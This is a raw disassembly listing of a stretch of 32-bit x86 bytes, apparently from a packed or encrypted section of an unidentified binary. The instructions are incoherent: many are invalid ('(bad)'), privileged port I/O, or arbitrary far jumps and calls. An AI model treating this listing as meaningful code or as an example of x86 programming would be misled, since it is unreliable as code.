  4162e1:	jmp    0xc6b1:0xb6d7e44e
  4162e8:	jnp    0x416333
  4162ea:	or     eax,0x68eb0960
  4162ef:	fcompp 
  4162f1:	fs cld 
  4162f3:	lock bound esp,QWORD PTR [esi-0x2e266050]
  4162fa:	or     eax,0xc7cda669
  4162ff:	fdiv   QWORD PTR [edx+0x45]
  416302:	sub    edx,edx
  416304:	jl     0x4162c1
  416306:	xor    BYTE PTR [eax+0x76],bl
  416309:	cmp    al,ah
  41630b:	pop    edi
  41630c:	xor    DWORD PTR [ebx-0x1a4786be],0x8e8af628
  416316:	jo     0x41636d
  416318:	cli    
  416319:	retf   
  41631a:	jp     0x4162be
  41631c:	iret   
  41631d:	pop    ebp
  41631e:	(bad)  
  41631f:	fstp   DWORD PTR [eax+0x34]
  416322:	mov    eax,ds:0x4e798956
  416327:	pop    edi
  416328:	jb     0x416392
  41632a:	popf   
  41632b:	dec    ecx
  41632c:	loope  0x4162de
  41632e:	xchg   esi,eax
  41632f:	pop    edx
  416330:	fld    QWORD PTR [esi-0x3bdf5bfe]
  416336:	inc    esi
  416337:	cwde   
  416338:	add    dh,BYTE PTR [edi+0x58]
  41633b:	mov    dl,0xab
  41633d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41633e:	sub    DWORD PTR [esi],0x2359b3fc
  416344:	push   ds
  416345:	dec    ebp
  416346:	push   edx
  416347:	je     0x416360
  416349:	stos   DWORD PTR es:[edi],eax
  41634a:	sbb    ecx,DWORD PTR [edx+0x1d74f8d1]
  416350:	lahf   
  416351:	adc    cl,BYTE PTR [ecx+0x7d9b4e31]
  416357:	aaa    
  416358:	dec    esp
  416359:	lock dec eax
  41635b:	sar    BYTE PTR [ebp-0x26],cl
  41635e:	(bad)
  416361:	imul   eax,DWORD PTR [edx-0x5f],0x37
  416365:	dec    esp
  416366:	push   0x7854a7f7
  41636b:	imul   ecx,DWORD PTR [edx-0x74],0xb59a76fe
  416372:	call   0x5ec21199
  416377:	or     eax,0xfcbfd5be
  41637c:	dec    edi
  41637d:	dec    ebp
  41637e:	xor    esp,esp
  416380:	fist   WORD PTR [ebx-0x25133f92]
  416386:	mov    ss,esp
  416388:	out    0xf6,al
  41638a:	ds jne 0x416345
  41638d:	mov    cl,0x16
  41638f:	(bad)  
  416390:	popa   
  416391:	inc    esi
  416392:	(bad)  
  416394:	xor    BYTE PTR [ebx+0x2ab6dbe5],bh
  41639a:	adc    edi,DWORD PTR [edi-0x59fda053]
  4163a0:	jno    0x4163d7
  4163a2:	cmp    edx,DWORD PTR [esi-0x20c9dd2]
  4163a8:	leave  
  4163a9:	jl     0x416367
  4163ab:	shr    DWORD PTR [ecx+0x4528402f],1
  4163b1:	int    0xda
  4163b3:	mov    edi,0x647917d6
  4163b8:	mov    dh,0xf0
  4163ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163bb:	dec    eax
  4163bc:	lods   al,BYTE PTR ds:[esi]
  4163bd:	sbb    BYTE PTR [ebx+0x46],0x37
  4163c1:	fstp   TBYTE PTR [esi-0x32]
  4163c4:	sbb    al,0x5f
  4163c6:	sub    DWORD PTR [edx+0x2e],esp
  4163c9:	and    al,0xef
  4163cb:	test   al,0x42
  4163cd:	bound  edi,QWORD PTR [eax+edx*8]
  4163d0:	scas   eax,DWORD PTR es:[edi]
  4163d1:	xor    BYTE PTR [ebx+0x4b],ch
  4163d4:	jns    0x416365
  4163d6:	xor    BYTE PTR [edi],ch
  4163d8:	sbb    BYTE PTR [edx-0x14],al
  4163db:	icebp  
  4163dc:	pop    edi
  4163dd:	out    0x1c,eax
  4163df:	cmp    ah,ch
  4163e1:	loope  0x416369
  4163e3:	(bad)  
  4163e5:	push   ds
  4163e6:	add    ah,BYTE PTR [edx]
  4163e8:	rcr    eax,1
  4163ea:	dec    esi
  4163eb:	adc    esi,esi
  4163ed:	xor    eax,DWORD PTR [ebx]
  4163ef:	xor    ah,BYTE PTR [esi]
  4163f1:	fwait
  4163f2:	iret   
  4163f3:	xor    DWORD PTR [edx+0x56c2570d],eax
  4163f9:	bnd jmp 0x41642b
  4163fc:	pop    ebx
  4163fd:	add    DWORD PTR [ebx-0x5bd587b1],ebx
  416403:	push   eax
  416404:	sbb    DWORD PTR [eax],ecx
  416406:	outs   dx,DWORD PTR ds:[esi]
  416407:	ds out 0x6a,al
  41640a:	enter  0x63d8,0x87
  41640e:	lods   al,BYTE PTR ds:[esi]
  41640f:	pop    es
  416410:	cmp    ecx,DWORD PTR [edx]
  416412:	mov    ah,0x1e
  416414:	stos   DWORD PTR es:[edi],eax
  416415:	xchg   edi,eax
  416416:	or     al,0x1e
  416418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416419:	push   eax
  41641a:	shr    esi,1
  41641c:	xchg   esi,eax
  41641d:	xchg   ebp,eax
  41641e:	xlat   BYTE PTR ds:[ebx]
  41641f:	pop    eax
  416420:	or     bl,bh
  416422:	std    
  416423:	ins    BYTE PTR es:[edi],dx
  416424:	add    al,0xa5
  416426:	dec    ecx
  416427:	or     eax,0xa07818b0
  41642c:	lods   al,BYTE PTR ds:[esi]
  41642d:	and    BYTE PTR [ecx-0x2b],al
  416430:	inc    ecx
  416431:	xchg   DWORD PTR [edi-0x6a],eax
  416434:	push   eax
  416435:	sub    ch,bh
  416437:	test   BYTE PTR ds:0x57c2a0bb,al
  41643d:	jns    0x4164a2
  41643f:	sbb    esi,DWORD PTR fs:[edx-0x63]
  416443:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416444:	popa   
  416445:	jmp    0x64db:0x91bd6f51
  41644c:	into   
  41644d:	and    eax,0xd0724449
  416452:	jg     0x4163f9
  416454:	push   edi
  416455:	in     eax,0x1d
  416457:	push   edi
  416458:	mov    ds:0xa638c175,al
  41645d:	jl     0x416488
  41645f:	and    eax,0xf1f529d8
  416464:	loopne 0x416475
  416466:	lods   al,BYTE PTR ds:[esi]
  416467:	adc    al,0x0
  416469:	shl    ch,1
  41646b:	pop    edi
  41646c:	(bad)  
  41646d:	stc    
  41646e:	bound  ecx,QWORD PTR [edi]
  416470:	lods   al,BYTE PTR ds:[esi]
  416471:	mov    edx,0x9c11611d
  416476:	das    
  416477:	and    bh,BYTE PTR [edi+eiz*4]
  41647a:	adc    esi,DWORD PTR [eax+0x2eaf286c]
  416480:	adc    esp,eax
  416482:	inc    ecx
  416483:	fisttp DWORD PTR [eax]
  416485:	cwde   
  416486:	call   0x41f9:0xaf55d233
  41648d:	mov    ch,0x6e
  41648f:	daa    
  416490:	in     eax,0x8a
  416492:	adc    DWORD PTR [eax+0x79],esp
  416495:	inc    edx
  416496:	ss call 0xcd59:0xaad40102
  41649e:	and    al,0x79
  4164a0:	into   
  4164a1:	data16 adc BYTE PTR ds:0x54bb06d4,bl
  4164a8:	mov    cl,0x2a
  4164aa:	clc    
  4164ab:	mov    eax,0x5a273be5
  4164b0:	sbb    al,0xa4
  4164b2:	call   0x72c74467
  4164b7:	lahf   
  4164b8:	sahf   
  4164b9:	aaa    
  4164ba:	je     0x416481
  4164bc:	cmp    eax,0xab64712b
  4164c1:	and    ecx,DWORD PTR [edx]
  4164c3:	test   BYTE PTR [esi-0x7],dl
  4164c6:	dec    ebp
  4164c7:	inc    esi
  4164c8:	push   edx
  4164c9:	rcr    DWORD PTR [edx-0x53476b75],1
  4164cf:	add    ecx,DWORD PTR [ecx-0xd]
  4164d2:	pop    edi
  4164d3:	inc    esi
  4164d4:	test   DWORD PTR [esi-0x30],0xddff8829
  4164db:	push   es
  4164dc:	cmp    bh,BYTE PTR [edi]
  4164de:	mov    ds:0x8db743da,eax
  4164e3:	sub    dh,BYTE PTR [eax+0x67735447]
  4164e9:	int3   
  4164ea:	push   ebp
  4164eb:	(bad)  
  4164ec:	(bad)  
  4164ed:	pop    ebp
  4164ee:	dec    edi
  4164ef:	pop    ss
  4164f0:	(bad)  
  4164f1:	pop    edx
  4164f2:	xor    ebp,DWORD PTR [ebx-0x58b323cf]
  4164f8:	xchg   ecx,eax
  4164f9:	ja     0x416502
  4164fb:	jmp    0xf715:0x3267c4d
  416502:	sti    
  416503:	test   BYTE PTR [edi],bl
  416505:	cmp    esi,DWORD PTR [edx+edx*8+0x7327d8bc]
  41650c:	jmp    0xa9a2790
  416511:	cwde   
  416512:	xchg   ebx,eax
  416513:	dec    ebx
  416514:	xchg   BYTE PTR ds:0x1e0cb484,cl
  41651a:	inc    esp
  41651b:	pop    ecx
  41651c:	loopne 0x4164e3
  41651e:	scas   eax,DWORD PTR es:[edi]
  41651f:	shl    BYTE PTR [ebx-0x2d],cl
  416522:	jno    0x416516
  416524:	int    0xbf
  416526:	or     al,0xc7
  416528:	mov    WORD PTR [esi+0x38564761],?
  41652e:	sub    BYTE PTR [ebp+ebp*2+0x212683fd],dl
  416535:	jnp    0x41659c
  416537:	mov    WORD PTR [edi+edx*8],?
  41653a:	sar    BYTE PTR [ecx],0x21
  41653d:	cld    
  41653e:	loopne 0x416549
  416540:	jbe    0x4165a2
  416542:	inc    ecx
  416543:	and    esp,DWORD PTR [edx-0x18]
  416546:	pop    edi
  416547:	inc    ebp
  416548:	jmp    0x9737:0x11f9fdb7
  41654f:	inc    esi
  416550:	enter  0xdfd3,0x4c
  416554:	pop    edx
  416555:	sbb    edi,DWORD PTR [ecx*8+0x791f250a]
  41655c:	sahf   
  41655d:	loopne 0x4165a5
  41655f:	xchg   ebp,eax
  416560:	mov    eax,ds:0xad458ea2
  416565:	stc    
  416566:	jb     0x41656c
  416568:	std    
  416569:	dec    esi
  41656a:	pop    edi
  41656b:	jno    0x4165ad
  41656d:	(bad)
  416570:	imul   edx,ecx,0xffffffb3
  416573:	test   al,0x10
  416575:	mov    ds:0x22ea8b0c,eax
  41657a:	outs   dx,DWORD PTR ds:[esi]
  41657b:	or     ebx,DWORD PTR [eax]
  41657d:	out    0x5d,eax
  41657f:	cmp    eax,0x21a96868
  416584:	sti    
  416585:	lods   al,BYTE PTR ds:[esi]
  416586:	dec    ecx
  416587:	clc    
  416588:	popf   
  416589:	out    0xa4,al
  41658b:	out    0xb5,eax
  41658d:	sub    eax,0xa38fe3ff
  416592:	xchg   edx,edi
  416594:	cmp    eax,0xb10f0d65
  416599:	or     esi,DWORD PTR [esi]
  41659b:	add    BYTE PTR ds:0xf78a9adc,dl
  4165a1:	xchg   edx,eax
  4165a2:	mov    esp,0x7c535418
  4165a7:	xor    esi,DWORD PTR [eiz*2+0x1fac0daa]
  4165ae:	stos   BYTE PTR es:[edi],al
  4165af:	push   0x6eb9fbf
  4165b4:	je     0x416589
  4165b6:	add    eax,0x2e63c498
  4165bb:	fbstp  TBYTE PTR [edi-0x13]
  4165be:	inc    eax
  4165bf:	loop   0x416587
  4165c1:	jno    0x416577
  4165c3:	mov    esi,0x4aa165e1
  4165c8:	lahf   
  4165c9:	neg    BYTE PTR [eax-0xe63891c]
  4165cf:	or     al,0xc
  4165d1:	stos   DWORD PTR es:[edi],eax
  4165d2:	or     al,0xa6
  4165d4:	and    edi,ecx
  4165d6:	mov    ah,0xab
  4165d8:	inc    edi
  4165d9:	fisttp QWORD PTR [edi-0x6d73f7c]
  4165df:	xchg   al,bl
  4165e1:	daa    
  4165e2:	frndint 
  4165e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165e5:	fsub   st,st(0)
  4165e7:	jbe    0x416573
  4165e9:	cs lahf 
  4165eb:	push   0xffffffe7
  4165ed:	push   esi
  4165ee:	mov    eax,0xe2d00ce8
  4165f3:	mov    al,0x41
  4165f5:	sbb    edi,DWORD PTR [esi-0xd034767]
  4165fb:	pop    esi
  4165fc:	rcl    edi,cl
  4165fe:	lahf   
  4165ff:	sub    bl,cl
  416601:	test   al,0xe
  416603:	inc    ebx
  416604:	inc    esp
  416605:	in     al,dx
  416606:	dec    esi
  416607:	imul   ebp,DWORD PTR [ecx],0x4b8c89dc
  41660d:	ja     0x416689
  41660f:	shr    BYTE PTR [ecx-0x42],1
  416612:	je     0x4165e9
  416614:	jb     0x416665
  416616:	fcom   QWORD PTR [ebp-0x6073f9c8]
  41661c:	mov    edi,0xcf9015c7
  416621:	sahf   
  416622:	cmp    bl,BYTE PTR [ecx]
  416624:	push   ds
  416625:	stos   DWORD PTR es:[edi],eax
  416626:	jno    0x416674
  416628:	outs   dx,DWORD PTR ds:[esi]
  416629:	fist   WORD PTR [edx]
  41662b:	je     0x41669f
  41662d:	(bad)  
  41662e:	pop    es
  41662f:	lods   al,BYTE PTR ds:[esi]
  416630:	inc    ebx
  416631:	outs   dx,DWORD PTR ds:[esi]
  416632:	fcmovnu st,st(7)
  416634:	ficom  DWORD PTR ds:0xb99e478b
  41663a:	stos   BYTE PTR es:[edi],al
  41663b:	xor    eax,0xb5ab34fb
  416640:	or     DWORD PTR [eax+ebp*8],ebp
  416643:	inc    esi
  416644:	outs   dx,BYTE PTR ds:[esi]
  416645:	(bad)  
  416646:	xchg   ecx,eax
  416647:	out    0xb9,al
  416649:	mov    BYTE PTR [ecx-0x48909c47],al
  41664f:	test   eax,0x5a9c6285
  416654:	or     cl,BYTE PTR [edi]
  416656:	test   BYTE PTR [ecx+eax*4],dl
  416659:	icebp  
  41665a:	inc    ebx
  41665b:	lods   eax,DWORD PTR ds:[esi]
  41665c:	lock out dx,eax
  41665e:	push   0x7e
  416660:	sbb    al,BYTE PTR [ecx]
  416662:	not    DWORD PTR [esi+eax*8+0x5c]
  416666:	jne    0x4166ab
  416668:	popa   
  416669:	sbb    DWORD PTR [ecx+0x5651641e],0x2e
  416670:	mov    BYTE PTR [ebx],dl
  416672:	sar    DWORD PTR [eax+0x783757],cl
  416678:	sbb    DWORD PTR [ebx-0x27],ecx
  41667b:	call   0xcc133788
  416680:	add    BYTE PTR [edx-0xaf9ca35],ah
  416686:	sub    DWORD PTR [ecx],ecx
  416688:	stos   DWORD PTR es:[edi],eax
  416689:	jns    0x416662
  41668b:	cmp    BYTE PTR [edi],bl
  41668d:	loopne 0x4166ce
  41668f:	mov    DWORD PTR [esi],edi
  416691:	push   edx
  416692:	test   eax,0x1870d32e
  416697:	(bad)  
  416698:	jmp    0x3f1e550c
  41669d:	sbb    DWORD PTR [ebp-0x5e],0x16e3f30c
  4166a4:	jge    0x41667d
  4166a6:	push   esi
  4166a7:	push   ebx
  4166a8:	xchg   edi,eax
  4166a9:	cmp    eax,0x89b1250d
  4166ae:	xchg   ebp,eax
  4166af:	(bad)  
  4166b0:	stos   BYTE PTR es:[edi],al
  4166b1:	pop    es
  4166b2:	test   al,0xdb
  4166b4:	pusha  
  4166b5:	fimul  WORD PTR [edx]
  4166b7:	inc    ebx
  4166b8:	cmp    al,0x11
  4166ba:	mov    ds:0x799fe99b,al
  4166bf:	in     al,0x3a
  4166c1:	xchg   ebx,eax
  4166c2:	aam    0xd2
  4166c4:	jbe    0x4166d5
  4166c6:	fwait
  4166c7:	leave  
  4166c8:	loopne 0x416744
  4166ca:	stos   DWORD PTR es:[edi],eax
  4166cb:	cmp    DWORD PTR [edi+eax*8-0x14],edx
  4166cf:	test   al,0xfc
  4166d1:	add    BYTE PTR [edi+ebp*4],dl
  4166d4:	mov    edx,0x148fd09d
  4166d9:	xchg   edi,eax
  4166da:	push   edi
  4166db:	in     eax,dx
  4166dc:	ins    DWORD PTR es:[edi],dx
  4166dd:	push   0x5a30bd34
  4166e2:	mov    DWORD PTR [esi-0x4d92a209],0x7beff6b6
  4166ec:	add    DWORD PTR [edx-0x2da5be46],esi
  4166f2:	xor    DWORD PTR ds:0xd665625c,ebx
  4166f8:	pop    edx
  4166f9:	mov    DWORD PTR [edi],ebp
  4166fb:	or     eax,0xd53c60a1
  416700:	pop    edx
  416701:	sti    
  416702:	adc    dh,BYTE PTR [ecx+esi*8+0x10cb2664]
  416709:	push   bx
  41670b:	dec    ebp
  41670c:	jnp    0x4166f4
  41670e:	pop    ss
  41670f:	jb     0x416704
  416711:	inc    edx
  416712:	rcr    DWORD PTR [edi+0x69],cl
  416715:	sub    bh,cl
  416717:	or     edi,DWORD PTR [ebx+0x6b]
  41671a:	shl    BYTE PTR [ecx+0x13c3c000],1
  416720:	adc    eax,0x91139ae1
  416725:	ins    BYTE PTR es:[edi],dx
  416726:	test   BYTE PTR [eax],bh
  416728:	test   al,0x4a
  41672a:	inc    edx
  41672b:	inc    esp
  41672c:	fwait
  41672d:	xchg   edx,eax
  41672e:	mov    WORD PTR [ecx+edx*8],ss
  416731:	push   0x6a
  416733:	outs   dx,BYTE PTR ds:[esi]
  416734:	(bad)  
  416735:	in     al,0x2b
  416737:	ret    
  416738:	cmp    BYTE PTR [eax+0x2cf00fdf],bh
  41673e:	gs dec esi
  416740:	dec    ebx
  416741:	jne    0x416743
  416743:	cld    
  416744:	sbb    DWORD PTR ds:0xd6bd99ce,edi
  41674a:	xchg   ebp,eax
  41674b:	xchg   edi,eax
  41674c:	cmp    DWORD PTR [eax+0x75],esp
  41674f:	sbb    DWORD PTR [ebx],ecx
  416751:	fldln2 
  416753:	adc    edx,ebx
  416755:	cdq    
  416756:	fst    st(2)
  416758:	lods   al,BYTE PTR ds:[esi]
  416759:	in     eax,dx
  41675a:	push   ebx
  41675b:	cli    
  41675c:	lea    edi,[esi+0x7bea6d3e]
  416762:	inc    ecx
  416763:	retf   
  416764:	inc    esi
  416765:	lahf   
  416766:	shl    DWORD PTR [eax+0xe],cl
  416769:	push   edi
  41676a:	retf   0x53aa
  41676d:	cld    
  41676e:	dec    esp
  41676f:	test   BYTE PTR [ebx+0x61a42707],al
  416775:	call   0x65da:0xac220e97
  41677c:	(bad)  
  41677d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41677e:	push   ecx
  41677f:	arpl   WORD PTR [edx],cx
  416781:	or     eax,0x2031f344
  416786:	icebp  
  416787:	ret    
  416788:	inc    ebp
  416789:	test   eax,0x59a6a8e3
  41678e:	or     eax,0xbf58c253
  416793:	or     bh,BYTE PTR [eax+0x60607ee7]
  416799:	xchg   edi,eax
  41679a:	mov    dl,0xc3
  41679c:	inc    ebx
  41679d:	cmp    al,0x22
  41679f:	xchg   BYTE PTR [edx+ebx*4-0x5a],ch
  4167a3:	push   ds
  4167a4:	cmc    
  4167a5:	xchg   ecx,eax
  4167a6:	loop   0x41674e
  4167a8:	sar    eax,1
  4167aa:	xchg   DWORD PTR [esp+ebx*1],eax
  4167ad:	lds    ecx,FWORD PTR [ebx]
  4167af:	int3   
  4167b0:	mov    bl,0xb0
  4167b2:	dec    edi
  4167b3:	xor    ah,BYTE PTR [esi]
  4167b5:	jo     0x4167ad
  4167b7:	jle    0x4167b8
  4167b9:	and    eax,0x37806d80
  4167be:	push   ebp
  4167bf:	jns    0x416757
  4167c1:	out    dx,al
  4167c2:	pop    ebp
  4167c3:	add    eax,0x2cdcd307
  4167c8:	aam    0xa6
  4167ca:	je     0x416822
  4167cc:	js     0x4167c2
  4167ce:	in     al,0x87
  4167d0:	nop
  4167d1:	pop    esi
  4167d2:	mov    edi,0xa05875cd
  4167d7:	sbb    DWORD PTR [edx+0x6b],ecx
  4167da:	fist   WORD PTR [edi-0x75170053]
  4167e0:	cmp    bl,al
  4167e2:	in     al,0xda
  4167e4:	jmp    0x41680f
  4167e6:	or     edx,esi
  4167e8:	mov    DWORD PTR [edx-0x49],0x3cb3cebc
  4167ef:	push   cs
  4167f0:	into   
  4167f1:	shr    DWORD PTR [ebp-0x60077596],cl
  4167f7:	cs ds stos DWORD PTR es:[edi],eax
  4167fa:	clc    
  4167fb:	sub    esp,DWORD PTR [ebx+ebx*8]
  4167fe:	inc    ebp
  4167ff:	inc    eax
  416800:	ds inc ebx
  416802:	les    ebp,FWORD PTR [ebp+0x65]
  416805:	mov    ebx,0x5b9517c
  41680a:	sahf   
  41680b:	pop    ebp
  41680c:	add    DWORD PTR [edx+ebp*2+0x31],ecx
  416810:	pop    esi
  416811:	mov    dh,0xf6
  416813:	jb     0x416799
  416815:	cwde   
  416816:	push   ds
  416817:	cmp    al,0xe4
  416819:	rep ins BYTE PTR es:[edi],dx
  41681b:	mov    ah,0x76
  41681d:	adc    bl,dl
  41681f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416820:	lods   eax,DWORD PTR ds:[esi]
  416821:	sub    al,0xf1
  416823:	cmc    
  416824:	jae    0x416854
  416826:	popa   
  416827:	xchg   ecx,eax
  416828:	ins    DWORD PTR es:[edi],dx
  416829:	sub    bh,ah
  41682b:	pop    edi
  41682c:	bound  ebp,QWORD PTR [ebx-0x56e3b180]
  416832:	xor    eax,DWORD PTR [ecx-0x7771c54b]
  416838:	js     0x416826
  41683a:	mov    cl,0xf6
  41683c:	arpl   WORD PTR [esp+esi*8],bp
  41683f:	stc    
  416840:	mov    ah,0xf9
  416842:	jbe    0x416820
  416844:	cs (bad) 
  416846:	les    ecx,FWORD PTR ds:0x2766cf7a
  41684c:	pop    ebx
  41684d:	cs les esp,FWORD PTR es:[ecx]
  416851:	jl     0x4167e5
  416853:	mov    cl,0xd2
  416855:	jmp    0xa1944e59
  41685a:	and    esi,DWORD PTR [edx-0x77]
  41685d:	adc    DWORD PTR [esi+0x6481876],ecx
  416863:	jp     0x416858
  416865:	out    dx,al
  416866:	mov    ebx,0xec4c2fe4
  41686b:	cwde   
  41686c:	adc    al,0xa2
  41686e:	or     BYTE PTR [esi],al
  416870:	shr    edi,0xa0
  416873:	adc    bh,BYTE PTR [esi]
  416875:	ds mov eax,edx
  416878:	inc    esp
  416879:	in     eax,dx
  41687a:	jae    0x416875
  41687c:	(bad)  
  41687d:	mov    dl,0xb6
  41687f:	fdivrp st(0),st
  416881:	les    ebp,FWORD PTR [eax+eiz*8-0x1d2316c4]
  416888:	stc    
  416889:	sub    eax,0x10da8be7
  41688e:	jnp    0x4168b8
  416890:	sub    DWORD PTR [edx],esi
  416892:	xchg   esp,eax
  416893:	xchg   esp,eax
  416894:	(bad)  [edi+0x3ae1052f]
  41689a:	outs   dx,DWORD PTR ds:[esi]
  41689b:	ud0    eax,DWORD PTR [ebp+0x7ef16973]
  4168a2:	inc    esi
  4168a3:	mov    al,0x49
  4168a5:	sub    esi,ebp
  4168a7:	int    0x7b
  4168a9:	push   cs
  4168aa:	inc    eax
  4168ab:	jbe    0x4168e1
  4168ad:	lock mov ss:0xa9b3e45,eax
  4168b4:	and    al,0x4c
  4168b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168b7:	mov    bh,0x62
  4168b9:	mov    ch,0xe2
  4168bb:	inc    esp
  4168bc:	cmp    DWORD PTR [ebx+ecx*4-0x27f55e76],0x76
  4168c4:	push   ebp
  4168c5:	out    dx,eax
  4168c6:	mov    ds:0x86bbfa34,al
  4168cb:	retf   
  4168cc:	aas    
  4168cd:	sub    al,0xb6
  4168cf:	add    eax,0x1995e68d
  4168d4:	jo     0x416937
  4168d6:	pop    esp
  4168d7:	mov    ebx,0x30dadac4
  4168dc:	pop    ds
  4168dd:	and    edx,DWORD PTR [bx-0x5]
  4168e1:	inc    ecx
  4168e2:	or     eax,0x33259f92
  4168e7:	call   0x611be154
  4168ec:	imul   esi,ebp,0x12
  4168ef:	dec    edx
  4168f0:	enter  0x535c,0xc8
  4168f4:	jb     0x4168e3
  4168f6:	push   ds
  4168f7:	push   edi
  4168f8:	btr    DWORD PTR [edi-0x4781b9b0],ebx
  4168ff:	inc    esp
  416900:	aas    
  416901:	pushf  
  416902:	rcl    BYTE PTR [ebx],0xd1
  416905:	inc    edx
  416906:	cmp    al,0x19
  416908:	push   esi
  416909:	cmc    
  41690a:	xor    cl,BYTE PTR [ecx]
  41690c:	and    al,0x1d
  41690e:	push   eax
  41690f:	sbb    BYTE PTR [ecx-0x5a4b939f],0x6e
  416916:	mov    ebx,0xefe92eda
  41691b:	mov    ds:0xb328f478,al
  416920:	int3   
  416921:	icebp  
  416922:	push   edx
  416923:	xchg   ecx,eax
  416924:	ins    DWORD PTR es:[edi],dx
  416925:	or     esp,DWORD PTR [ebx+0x23b940a4]
  41692b:	inc    ebp
  41692c:	jl     0x41698b
  41692e:	rcl    DWORD PTR [ebx-0x2d0f6f7],cl
  416934:	mov    al,ds:0x3b519783
  416939:	gs (bad) 
  41693b:	mov    edi,0x54ee50b1
  416940:	xor    ebx,esi
  416942:	mov    bl,BYTE PTR [ebp+esi*2+0x2b]
  416946:	rcl    bl,cl
  416948:	iret   
  416949:	xchg   ecx,eax
  41694a:	cmp    bh,BYTE PTR [eax]
  41694c:	outs   dx,DWORD PTR ds:[si]
  41694e:	in     eax,dx
  41694f:	push   edi
  416950:	stos   DWORD PTR es:[edi],eax
  416951:	shld   eax,esp,0x71
  416955:	and    al,0xc5
  416957:	inc    esi
  416958:	xchg   DWORD PTR [ebp-0x4d48a60d],edx
  41695e:	or     al,0x6a
  416960:	add    DWORD PTR [ebx-0x4c],ebp
  416963:	test   eax,0xe0849e7f
  416968:	test   eax,ebp
  41696a:	out    dx,eax
  41696b:	mov    ebx,0xa7bf7c33
  416970:	imul   edx,DWORD PTR [edi+0x17a36ec6],0x1499f748
  41697a:	push   esi
  41697b:	sub    eax,0xb5112922
  416980:	push   ss
  416981:	imul   esp,DWORD PTR [edx+0x644a2264],0x2e3ff948
  41698b:	call   0x1e6d6d01
  416990:	mov    ecx,ss
  416992:	leave  
  416993:	mov    al,al
  416995:	cdq    
  416996:	sub    ch,cl
  416998:	popa   
  416999:	add    DWORD PTR [eax+0x30],0x60bd3fdf
  4169a0:	pop    esp
  4169a1:	sub    BYTE PTR [eax-0x23],dl
  4169a4:	(bad)  
  4169a5:	mov    ebp,0xaeaae2a1
  4169aa:	mov    ds:0x7f477916,al
  4169af:	mov    WORD PTR [ecx],gs
  4169b1:	shl    DWORD PTR [ebx-0x7c],0x50
  4169b5:	add    eax,0x9c8dc2e8
  4169ba:	(bad)  
  4169bb:	(bad)  
  4169bc:	push   esi
  4169bd:	inc    eax
  4169be:	mov    dh,0x22
  4169c0:	fstp   DWORD PTR [ebx-0x21650b6b]
  4169c6:	ja     0x4169ea
  4169c8:	cmp    eax,0x72914030
  4169cd:	adc    BYTE PTR [edi-0x39],bl
  4169d0:	or     ch,BYTE PTR [edi-0x60]
  4169d3:	dec    ebx
  4169d4:	test   eax,0xf9631a0e
  4169d9:	int3   
  4169da:	jecxz  0x4169a7
  4169dc:	fisubr DWORD PTR [ecx+0x1ff208db]
  4169e2:	xchg   edi,eax
  4169e3:	dec    edx
  4169e4:	jne    0x4169b8
  4169e6:	and    eax,ebp
  4169e8:	aam    0xb4
  4169ea:	adc    DWORD PTR [edi-0x4a],ebx
  4169ed:	ror    BYTE PTR [edx-0x11],cl
  4169f0:	ret    0xac92
  4169f3:	(bad)
  4169f7:	xor    al,0xaf
  4169f9:	sbb    DWORD PTR [esi-0x75ebd455],esi
  4169ff:	and    edx,DWORD PTR es:0xed7248e7
  416a06:	add    eax,ecx
  416a08:	addr16 je 0x4169a3
  416a0b:	icebp  
  416a0c:	daa    
  416a0d:	or     eax,0xfa6dc1eb
  416a12:	loop   0x416a6c
  416a14:	and    al,0xd4
  416a16:	loopne 0x416a48
  416a18:	and    BYTE PTR [edi+0x48],0x22
  416a1c:	pop    esp
  416a1d:	sbb    edi,ebx
  416a1f:	fwait
  416a20:	ds jbe 0x416a1b
  416a23:	inc    ecx
  416a24:	xor    al,0xcb
  416a26:	out    dx,eax
  416a27:	(bad)  
  416a28:	adc    al,0x55
  416a2a:	or     al,BYTE PTR [ebp-0x26]
  416a2d:	cs pop es
  416a2f:	mov    eax,0x5af918a
  416a34:	inc    esi
  416a35:	aaa    
  416a36:	cmc    
  416a37:	pop    ebp
  416a38:	sbb    edx,edi
  416a3a:	rcr    DWORD PTR [ebx-0x56db742c],cl
  416a40:	and    dh,BYTE PTR [ecx-0x57]
  416a43:	mov    gs,WORD PTR [ebp+0x7f]
  416a46:	add    DWORD PTR [ebx+0x6e],esp
  416a49:	sub    eax,0x2d78070a
  416a4e:	pop    esi
  416a4f:	dec    edi
  416a50:	pop    ds
  416a51:	mov    edi,0x6c03ee67
  416a56:	pop    es
  416a57:	sub    BYTE PTR [ecx-0x622bf34],ah
  416a5d:	mov    eax,ds:0x2baa60cc
  416a62:	jno    0x416a63
  416a64:	into   
  416a65:	dec    eax
  416a66:	adc    al,0x5b
  416a68:	sbb    eax,0xe618a104
  416a6d:	ss (bad) 
  416a6f:	enter  0xca7c,0x7d
  416a73:	test   al,0x20
  416a75:	mov    dh,0xaa
  416a77:	inc    ecx
  416a78:	mov    ss,WORD PTR [edx]
  416a7a:	repz ret 0xda80
  416a7e:	mov    edi,0xe12ddebe
  416a83:	retf   0xf837
  416a86:	push   edi
  416a87:	push   ebx
  416a88:	cld    
  416a89:	sbb    eax,0x2e567d9f
  416a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a8f:	sub    eax,DWORD PTR [edi+0x7a]
  416a92:	cmovg  esi,edi
  416a95:	es cmp edx,ecx
  416a98:	or     bl,BYTE PTR [eax]
  416a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a9b:	mov    ch,0x5d
  416a9d:	or     DWORD PTR [edx],ebp
  416a9f:	jmp    0xc8ab:0x70f9709a
  416aa6:	dec    ecx
  416aa7:	fdivp  st(0),st
  416aa9:	mov    edx,0x6efc6f78
  416aae:	push   0x41684aa2
  416ab3:	and    eax,0xa95b3256
  416ab8:	pop    edi
  416ab9:	push   es
  416aba:	push   0x23
  416abc:	(bad)  
  416abd:	fnstcw WORD PTR [ecx]
  416abf:	loopne 0x416ad2
  416ac1:	xchg   edx,eax
  416ac2:	rcl    BYTE PTR [edx-0x3ea12d3b],1
  416ac8:	mov    bl,dh
